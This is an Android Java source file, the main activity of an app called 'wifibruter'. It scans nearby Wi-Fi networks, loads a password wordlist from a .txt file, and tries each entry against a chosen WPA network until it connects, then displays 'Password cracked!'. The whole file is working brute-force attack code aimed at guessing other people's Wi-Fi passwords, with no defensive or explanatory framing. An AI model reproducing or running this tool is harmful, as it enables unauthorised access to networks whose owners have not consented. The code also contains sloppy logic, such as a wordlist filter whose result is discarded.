package com.emre.wifibruter;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.text.Editable;
import android.text.TextWatcher;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.CompoundButton;
import android.widget.ImageView;
import android.widget.ListView;
import android.widget.ProgressBar;
import android.widget.Switch;
import android.widget.TextView;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class MainActivity extends Activity implements OnConnectFailedCallback, OnConnectSuccessCallback{

    public File PATH  = new File("/data/data/com.emre.wifibruter/files/path");
    private final static String WIFI_SERVICE_APP = "wifi";
    private WifiManager wifiManager;
    private ArrayList<String> SSIDs,security_list;
    private ListView listView;
    private Button import_wl,start_brute_force;
    private TextView tv1,tv2,tv3;
    private ProgressBar progressBar;
    public String selectedSSID = "";
    public ArrayList<String> targetWordlist;
    private ImageView scan;
    //private TRY_TO_CONNECT try_to_connect;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        final Switch wifiSwitch = findViewById(R.id.wifiSwitch);
        listView = findViewById(R.id.networksListView);
        import_wl = findViewById(R.id.import_wordlist_button);
        tv1 = findViewById(R.id.ssid_tv);
        tv2 = findViewById(R.id.pass_tv);
        tv3 = findViewById(R.id.wl_path_tv);
        progressBar = findViewById(R.id.progressBar);
        start_brute_force = findViewById(R.id.start_brute_force_attack);
        scan = findViewById(R.id.scanImageView);

        if (PATH.exists()){
            final String tempPath = new FileReader().getFileContext("path");
            tv3.setText(tempPath);
            new Thread(new Runnable() {
                @Override
                public void run() {
                    targetWordlist = wordlist(tempPath);
                }
            }).start();
        }

        SSIDs = new ArrayList<>();
        targetWordlist = new ArrayList<>();
        security_list = new ArrayList<>();

        wifiManager = (WifiManager) getSystemService(WIFI_SERVICE_APP);

        if (wifiManager != null) {
            wifiSwitch.setChecked(wifiManager.isWifiEnabled());
        }

        wifiSwitch.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(CompoundButton compoundButton, boolean b) {
                wifiManager.setWifiEnabled(b);
            }
        });

        registerReceiver(mWifiScanReceiver,
                new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION));
        wifiManager.startScan();

        import_wl.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                browseFiles();
            }
        });

        listView.setOnItemClickListener(new AdapterView.OnItemClickListener() {
            @Override
            public void onItemClick(AdapterView<?> adapterView, View view, int i, long l) {
                selectedSSID = SSIDs.get(i);
                Toast.makeText(MainActivity.this,"Selected SSID: "+selectedSSID,Toast.LENGTH_LONG).show();
                tv1.setText("SSID: "+selectedSSID);
            }
        });

        start_brute_force.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                if (selectedSSID.equals("")){
                    Toast.makeText(MainActivity.this,"Please select a SSID!",Toast.LENGTH_LONG).show();
                }else {
                    /*try_to_connect = new TRY_TO_CONNECT();
                    try_to_connect.execute(selectedSSID);*/
                    tryToConnect(0);
                }
            }
        });

        registerReceiver();

        scan.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                wifiManager.startScan();
            }
        });

        tv3.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {

            }

            @Override
            public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {

            }

            @Override
            public void afterTextChanged(Editable editable) {
                if (new File(tv3.getText().toString()).exists()) {
                    if (tv3.getText().toString().contains(".txt")) {
                        FileWriter.writeFile("path", MainActivity.this, tv3.getText().toString());
                    }
                }
            }
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        unregisterReceiver(mWifiScanReceiver);
        unregisterReceiver(connectingReceiver);
    }

    @Override
    public void onConnectFailedCallback() {
        Log.d("failed","");
        tv2.setText("Trying for: " + targetWordlist.get(generalIndex));
        connectToWPA(selectedSSID, targetWordlist.get(generalIndex));
        if (!(generalIndex==targetWordlist.size())) {
            generalIndex++;
        }
    }

    @Override
    public void onConnectSuccessCallback() {
        Log.d("success","");
        tv2.setText("Password cracked! Password is "+targetWordlist.get(generalIndex-1));
        progressBar.setVisibility(View.INVISIBLE);
    }
    //public static boolean x;

    private void registerReceiver() {
        IntentFilter filter = new IntentFilter();
        filter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
        filter.addAction(WifiManager.SUPPLICANT_STATE_CHANGED_ACTION);
        registerReceiver(connectingReceiver, filter);
    }

    private final BroadcastReceiver mWifiScanReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context c, Intent intent) {
            if (intent.getAction().equals(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION)) {
                List<ScanResult> mScanResults = wifiManager.getScanResults();

                SSIDs.clear();

                for (int i=0; i<mScanResults.size(); i++){
                    SSIDs.add(mScanResults.get(i).SSID);

                    if (mScanResults.get(i).capabilities.contains("WEP")){
                        security_list.add("WEP");
                    }
                    if (mScanResults.get(i).capabilities.contains("WPA")){
                        //Toast.makeText(MainActivity.this, "SSID: "+mScanResults.get(i).SSID+"SECURITY: WPA2",Toast.LENGTH_LONG).show();
                        security_list.add("WPA");
                    }
                }

                ArrayAdapter<String> itemsAdapter =
                        new ArrayAdapter<>(MainActivity.this, android.R.layout.simple_list_item_1, SSIDs);

                listView.setAdapter(itemsAdapter);
            }
        }
    };

    public boolean tried = false;
    public int generalIndex = 1;

    private void tryToConnect(int index){
        if (!(index==targetWordlist.size())){
                progressBar.setVisibility(View.VISIBLE);
                tv2.setText("Trying for: " + targetWordlist.get(index));
                connectToWPA(selectedSSID, targetWordlist.get(index));
                tried = true;
        }else {
            Log.e("size is","zero");
        }
    }

    private BroadcastReceiver connectingReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {

            NetworkInfo info = intent.getParcelableExtra(WifiManager.EXTRA_NETWORK_INFO);
            if (info != null) {
                if (info.isConnected()) {
                    //try_to_connect.x = false;
                    wifiManager = (WifiManager) getSystemService(WIFI_SERVICE_APP);
                    WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                    Log.d("SSID", wifiInfo.getSSID());
                    if (wifiInfo.getSSID().contains(selectedSSID)) {
                        if (tried) {
                            onConnectSuccessCallback();
                        }
                    }
                }
            } else {
                if (intent.getAction().equals(WifiManager.SUPPLICANT_STATE_CHANGED_ACTION)) {
                    if (intent.hasExtra(WifiManager.EXTRA_SUPPLICANT_ERROR)) {
                        //failed to connect
                        onConnectFailedCallback();
                    }
                }
            }
        }
    };

    private int connectToWPA(String networkSSID, String password){
        WifiConfiguration conf = new WifiConfiguration();
        conf.SSID = "\"" + networkSSID + "\"";
        conf.preSharedKey = "\"" + password + "\"";
//      conf.hiddenSSID = true;
//      conf.wepTxKeyIndex = 0;
//      conf.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_PSK);
//      conf.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.WEP40);

        conf.status = WifiConfiguration.Status.ENABLED;
        conf.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.TKIP);
        conf.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.CCMP);
        conf.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_PSK);
        conf.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.TKIP);
        conf.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.CCMP);
        conf.allowedProtocols.set(WifiConfiguration.Protocol.RSN);

        int networkId = wifiManager.addNetwork(conf);
        if (networkId != -1)
        {
            wifiManager.disconnect();
            wifiManager.enableNetwork(networkId, true);
            // Use this to permanently save this network
            // Otherwise, it will disappear after a reboot
            wifiManager.saveConfiguration();
            wifiManager.reconnect();
        }
        return networkId;
    }

    private ArrayList<String> wordlist(String filePath){
        ArrayList<String> result = new ArrayList<>();
        File file = new File(filePath);
        StringBuilder text = new StringBuilder();
        try {
            BufferedReader br = new BufferedReader(new java.io.FileReader(file));
            String line;
            while ((line = br.readLine()) != null) {
                text.append(line);
                text.append("\n");
            }
            br.close();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        String[] a = text.toString().split("\n");

        for (int f=0; f<a.length; f++){
            if (a[f].length()>7){
                result.add(a[f]);
            }
        }

        return new ArrayList<>(Arrays.asList(a));
    }

    /*
    private void connectToWifi(String networkSSID, String networkPass, String security){
        WifiConfiguration conf = new WifiConfiguration();
        conf.SSID = "\"" + networkSSID + "\"";

        if (security.equals("WEP")){
            conf.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE);
            conf.wepKeys[0] = "\"" + networkPass + "\"";
            conf.wepTxKeyIndex = 0;
        }

        if (security.equals("WPA")){
            conf.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_PSK);
            conf.preSharedKey = "\""+ networkPass +"\"";
        }

        //conf.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE);
        //conf.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.WEP40);

        List<WifiConfiguration> list = wifiManager.getConfiguredNetworks();
        for( WifiConfiguration i : list ) {
            if(i.SSID != null && i.SSID.equals("\"" + networkSSID + "\"")) {
                wifiManager.disconnect();
                wifiManager.enableNetwork(i.networkId, true);
                wifiManager.reconnect();

                break;
            }
        }
    }
    */

    public String getRealPathFromURI(Context context, Uri contentUri) {
        Cursor cursor = null;
        try {
            String[] proj = {MediaStore.Images.Media.DATA};
            cursor = context.getContentResolver().query(contentUri, proj, null, null, null);
            int column_index = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
            cursor.moveToFirst();
            return cursor.getString(column_index);
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (data!=null) {
            Uri filePath = data.getData();
            try {
                String wl_path = getRealPathFromURI(getApplicationContext(), filePath);
                if (wl_path.contains(".txt")) {
                    targetWordlist = wordlist(wl_path);
                    FileWriter.writeFile("path", MainActivity.this, wl_path);
                    //Log.d("WORDLIST", String.valueOf(targetWordlist));
                    tv3.setText(wl_path);
                }else {
                    createDialog("Not a wordlist file","Please select .txt file format");
                }
            }catch (Exception e){
                e.printStackTrace();
            }
        }
        super.onActivityResult(requestCode, resultCode, data);

    }

    private void browseFiles(){
        Intent i = new Intent(Intent.ACTION_GET_CONTENT);
        i.setType("file/*");
        startActivityForResult(i, 3);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

    private void createDialog(String title,String content){
        AlertDialog.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            builder = new AlertDialog.Builder(this, android.R.style.Theme_Material_Dialog_Alert);
        } else {
            builder = new AlertDialog.Builder(this);
        }
        builder.setTitle(title)
                .setMessage(content)
                .setPositiveButton(android.R.string.yes, new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int which) {
                        // continue with delete
                    }
                })
                .show();
    }
}